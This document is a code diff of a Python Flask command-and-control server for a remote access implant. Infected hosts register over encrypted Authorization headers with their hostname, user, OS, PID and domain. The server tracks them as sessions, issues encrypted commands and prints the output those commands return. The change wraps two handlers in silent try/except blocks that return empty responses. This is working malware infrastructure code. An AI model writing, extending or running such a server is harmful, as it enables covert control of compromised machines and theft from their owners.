@@ -252,13 +252,12 @@ def command(hostname):
 
 @app.route(command_receiver_url)
 def cr():
-        #if request.method == "POST":
-        encrypted_response = request.headers["Authorization"]
-        print("\nCommand execution result is : \n" + decrypt_command(aes_encryption_key, encrypted_response).strip("\x00") + "\n")
-        return "Done"
-
-        #else:
-        #    return "A"
+        try:
+            encrypted_response = request.headers["Authorization"]
+            print("\nCommand execution result is : \n" + decrypt_command(aes_encryption_key, encrypted_response).strip("\x00") + "\n")
+            return "Done"
+        except:
+            return ""
 
 
 @app.errorhandler(404)
@@ -270,23 +269,26 @@ def page_not_found(e):
 
 @app.route(first_ping_url)
 def first_ping():
-        global counter
-        header = request.headers["Authorization"]
-        raw_request = str(decrypt_command(aes_encryption_key, header)).strip("\x00").split(",")
-        hostname = raw_request[0]
-        if hostname in list(commands.keys()):
-                return "HostName exist"
+        try:
+            global counter
+            header = request.headers["Authorization"]
+            raw_request = str(decrypt_command(aes_encryption_key, header)).strip("\x00").split(",")
+            hostname = raw_request[0]
+            if hostname in list(commands.keys()):
+                    return "HostName exist"
 
-        username = raw_request[1]
-        os_version = raw_request[2]
-        pid = raw_request[3]
-        domain = raw_request[4]
-        ip = request.environ['REMOTE_ADDR']
-        last_ping = time.ctime()
-        connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
-        print("\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter))
-        commands[hostname] = encrypt_command(aes_encryption_key, "False")
-        counter = counter + 1
-        response = make_response("")
-        response.headers["Server"] = server_response_header
-        return response
+            username = raw_request[1]
+            os_version = raw_request[2]
+            pid = raw_request[3]
+            domain = raw_request[4]
+            ip = request.environ['REMOTE_ADDR']
+            last_ping = time.ctime()
+            connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
+            print("\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter))
+            commands[hostname] = encrypt_command(aes_encryption_key, "False")
+            counter = counter + 1
+            response = make_response("")
+            response.headers["Server"] = server_response_header
+            return response
+        except:
+            return ""
